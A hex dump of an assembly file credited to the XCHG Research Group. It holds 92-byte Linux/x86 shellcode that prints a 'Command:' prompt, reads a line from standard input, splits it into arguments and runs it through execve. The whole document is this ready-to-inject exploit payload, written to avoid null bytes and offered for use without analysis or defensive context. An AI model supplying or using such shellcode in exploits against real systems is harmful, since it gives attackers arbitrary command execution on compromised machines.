00000000  23 20 20 20 20 58 43 48  47 20 52 65 73 65 61 72  |#    XCHG Resear|
00000010  63 68 20 47 72 6f 75 70  0d 0a 23 20 20 20 20 4c  |ch Group..#    L|
00000020  69 6e 75 78 2f 78 38 36  20 65 78 65 63 76 65 20  |inux/x86 execve |
00000030  72 65 61 64 20 73 68 65  6c 6c 63 6f 64 65 20 2d  |read shellcode -|
00000040  20 39 32 20 62 79 74 65  73 0d 0a 23 20 20 20 20  | 92 bytes..#    |
00000050  0d 0a 23 20 20 20 20 0d  0a 23 20 20 20 20 29 2d  |..#    ..#    )-|
00000060  2d 5b 20 57 72 69 74 65  64 20 62 79 20 30 75 74  |-[ Writed by 0ut|
00000070  30 66 62 6f 75 6e 64 20  5d 2d 2d 28 0d 0a 23 20  |0fbound ]--(..# |
00000080  20 20 20 0d 0a 23 20 20  20 20 2d 20 68 74 74 70  |   ..#    - http|
00000090  3a 2f 2f 6f 75 74 6f 66  62 6f 75 6e 64 2e 68 6f  |://outofbound.ho|
000000a0  73 74 2e 73 6b 0d 0a 23  20 20 20 20 2d 20 68 74  |st.sk..#    - ht|
000000b0  74 70 3a 2f 2f 78 63 68  67 6c 61 62 73 2e 68 6f  |tp://xchglabs.ho|
000000c0  73 74 2e 73 6b 0d 0a 0d  0a 2e 74 65 78 74 0d 0a  |st.sk.....text..|
000000d0  0d 0a 09 2e 67 6c 6f 62  6c 20 5f 73 74 61 72 74  |....globl _start|
000000e0  0d 0a 0d 0a 5f 73 74 61  72 74 3a 0d 0a 0d 0a 23  |...._start:....#|
000000f0  20 45 41 58 20 3d 20 30  78 30 34 20 2d 3e 20 73  | EAX = 0x04 -> s|
00000100  79 73 63 61 6c 6c 20 77  72 69 74 65 28 29 0d 0a  |yscall write()..|
00000110  09 78 6f 72 6c 20 25 65  61 78 2c 20 25 65 61 78  |.xorl %eax, %eax|
00000120  0d 0a 09 6d 6f 76 62 20  24 30 78 34 2c 20 25 61  |...movb $0x4, %a|
00000130  6c 0d 0a 09 78 6f 72 6c  20 25 65 62 78 2c 20 25  |l...xorl %ebx, %|
00000140  65 62 78 0d 0a 09 69 6e  63 20 25 65 62 78 0d 0a  |ebx...inc %ebx..|
00000150  09 70 75 73 68 6c 20 24  30 78 32 30 32 30 32 30  |.pushl $0x202020|
00000160  32 30 0d 0a 09 70 75 73  68 6c 20 24 30 78 33 61  |20...pushl $0x3a|
00000170  36 34 36 65 36 31 0d 0a  09 70 75 73 68 6c 20 24  |646e61...pushl $|
00000180  30 78 36 64 36 64 36 66  34 33 0d 0a 09 6d 6f 76  |0x6d6d6f43...mov|
00000190  6c 20 25 65 73 70 2c 20  25 65 63 78 0d 0a 09 78  |l %esp, %ecx...x|
000001a0  6f 72 6c 20 25 65 64 78  2c 20 25 65 64 78 0d 0a  |orl %edx, %edx..|
000001b0  09 6d 6f 76 62 20 24 30  78 39 2c 20 25 64 6c 0d  |.movb $0x9, %dl.|
000001c0  0a 09 69 6e 74 20 24 30  78 38 30 20 0d 0a 09 0d  |..int $0x80 ....|
000001d0  0a 23 20 45 41 58 20 3d  20 30 78 30 33 20 2d 3e  |.# EAX = 0x03 ->|
000001e0  20 73 79 73 63 61 6c 6c  20 72 65 61 64 28 29 0d  | syscall read().|
000001f0  0a 09 78 6f 72 6c 20 25  65 61 78 2c 20 25 65 61  |..xorl %eax, %ea|
00000200  78 0d 0a 09 6d 6f 76 62  20 24 30 78 33 2c 20 25  |x...movb $0x3, %|
00000210  61 6c 0d 0a 09 78 6f 72  6c 20 25 65 62 78 2c 20  |al...xorl %ebx, |
00000220  25 65 62 78 0d 0a 09 78  6f 72 6c 20 25 65 64 78  |%ebx...xorl %edx|
00000230  2c 20 25 65 64 78 0d 0a  09 6d 6f 76 62 20 24 30  |, %edx...movb $0|
00000240  78 32 30 2c 20 25 64 6c  0d 0a 09 73 75 62 6c 20  |x20, %dl...subl |
00000250  25 65 64 78 2c 20 25 65  73 70 0d 0a 09 6d 6f 76  |%edx, %esp...mov|
00000260  6c 20 25 65 73 70 2c 20  25 65 63 78 0d 0a 09 69  |l %esp, %ecx...i|
00000270  6e 74 20 24 30 78 38 30  20 0d 0a 09 0d 0a 23 20  |nt $0x80 .....# |
00000280  62 75 66 66 65 72 5b 72  65 61 64 28 30 2c 20 62  |buffer[read(0, b|
00000290  75 66 66 65 72 2c 20 73  69 7a 65 6f 66 28 62 75  |uffer, sizeof(bu|
000002a0  66 66 65 72 29 29 5d 20  3d 20 30 3b 0d 0a 09 61  |ffer))] = 0;...a|
000002b0  64 64 6c 20 25 65 61 78  2c 20 25 65 63 78 0d 0a  |ddl %eax, %ecx..|
000002c0  09 64 65 63 20 25 65 63  78 20 0d 0a 09 6d 6f 76  |.dec %ecx ...mov|
000002d0  6c 20 25 65 62 78 2c 20  28 25 65 63 78 29 0d 0a  |l %ebx, (%ecx)..|
000002e0  09 0d 0a 09 6d 6f 76 6c  20 25 65 73 70 2c 20 25  |....movl %esp, %|
000002f0  65 62 78 0d 0a 09 61 64  64 6c 20 25 65 61 78 2c  |ebx...addl %eax,|
00000300  20 25 65 62 78 0d 0a 09  6d 6f 76 6c 20 25 65 61  | %ebx...movl %ea|
00000310  78 2c 20 25 65 63 78 0d  0a 09 0d 0a 09 78 6f 72  |x, %ecx......xor|
00000320  6c 20 25 65 64 78 2c 20  25 65 64 78 0d 0a 09 70  |l %edx, %edx...p|
00000330  75 73 68 20 25 65 64 78  20 0d 0a 09 0d 0a 4c 4f  |ush %edx .....LO|
00000340  4f 50 31 3a 20 0d 0a 09  6d 6f 76 62 20 28 25 65  |OP1: ...movb (%e|
00000350  62 78 29 2c 20 25 61 6c  0d 0a 09 63 6d 70 20 24  |bx), %al...cmp $|
00000360  30 78 32 30 2c 20 25 61  6c 0d 0a 09 6a 6e 65 20  |0x20, %al...jne |
00000370  43 4f 4e 54 20 0d 0a 09  78 6f 72 62 20 24 30 78  |CONT ...xorb $0x|
00000380  32 30 2c 20 28 25 65 62  78 29 0d 0a 09 69 6e 63  |20, (%ebx)...inc|
00000390  20 25 65 62 78 20 0d 0a  09 70 75 73 68 6c 20 25  | %ebx ...pushl %|
000003a0  65 62 78 20 0d 0a 09 64  65 63 20 25 65 62 78 20  |ebx ...dec %ebx |
000003b0  0d 0a 43 4f 4e 54 3a 20  0d 0a 09 64 65 63 20 25  |..CONT: ...dec %|
000003c0  65 62 78 20 0d 0a 6c 6f  6f 70 20 4c 4f 4f 50 31  |ebx ..loop LOOP1|
000003d0  20 0d 0a 09 0d 0a 09 70  75 73 68 20 25 65 62 78  | ......push %ebx|
000003e0  20 0d 0a 09 0d 0a 09 6d  6f 76 6c 20 25 65 73 70  | ......movl %esp|
000003f0  2c 20 25 65 63 78 0d 0a  09 78 6f 72 6c 20 25 65  |, %ecx...xorl %e|
00000400  61 78 2c 20 25 65 61 78  0d 0a 09 6d 6f 76 62 20  |ax, %eax...movb |
00000410  24 30 78 62 2c 20 25 61  6c 0d 0a 09 0d 0a 09 69  |$0xb, %al......i|
00000420  6e 74 20 24 30 78 38 30  20 0d 0a 09 0d 0a 23 20  |nt $0x80 .....# |
00000430  45 41 58 20 3d 20 30 78  30 31 20 2d 3e 20 73 79  |EAX = 0x01 -> sy|
00000440  73 63 61 6c 6c 20 65 78  69 74 0d 0a 09 78 6f 72  |scall exit...xor|
00000450  6c 20 25 65 61 78 2c 20  25 65 61 78 0d 0a 09 69  |l %eax, %eax...i|
00000460  6e 63 20 25 61 6c 20 0d  0a 09 78 6f 72 6c 20 25  |nc %al ...xorl %|
00000470  65 62 78 2c 20 25 65 62  78 0d 0a 09 69 6e 74 20  |ebx, %ebx...int |
00000480  24 30 78 38 30                                    |$0x80|
00000485
